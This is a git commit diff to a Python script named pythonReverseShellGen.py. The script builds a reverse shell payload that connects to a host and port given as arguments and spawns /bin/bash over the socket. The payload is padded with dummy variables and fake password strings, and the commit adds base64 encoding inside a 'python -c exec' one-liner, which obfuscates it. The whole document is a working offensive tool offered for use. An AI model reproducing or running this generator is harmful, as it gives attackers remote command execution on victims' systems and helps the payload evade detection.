7b483a37ec03f004b90835050eb50140da1209ce
Shibin B Shaji <shibinbshaji007@gmail.com>
2020-05-27 22:58:10 +0530

    eval added

--- pythonReverseShellGen.py
+++ pythonReverseShellGen.py
@@ -1,7 +1,11 @@
 import sys
+import base64
 host = str(sys.argv[1])
 port = sys.argv[2]
 
 payload = "import base64 , socket    ,  subprocess    ,  os        ;dummyVar = \"This is a file\";password = \"Th!$isThePa55W0rD\" ;password2 = \"Th!$isThePa55W0rD\" ;password3 = \"Th!$isThePa55W0rD\" ;WhatPort=" + port + "      ;connectTo=\"" + host + "\"      ;s=socket.socket(socket.AF_INET    ,  socket.SOCK_STREAM)        ;s.connect((connectTo    ,  WhatPort))        ;os.dup2(s.fileno()    ,  0)        ;os.dup2(s.fileno()    ,  1)        ;os.dup2(s.fileno()    ,  2)        ;p=subprocess.call(\"/bin/bash\")"
+payload = base64.b64encode(payload.encode('utf-8'))
 
-print(payload)
+payload2 = "python -c \"exec("+str(payload)+".decode('base64').decode('utf-8'))\""
+
+print(payload2)
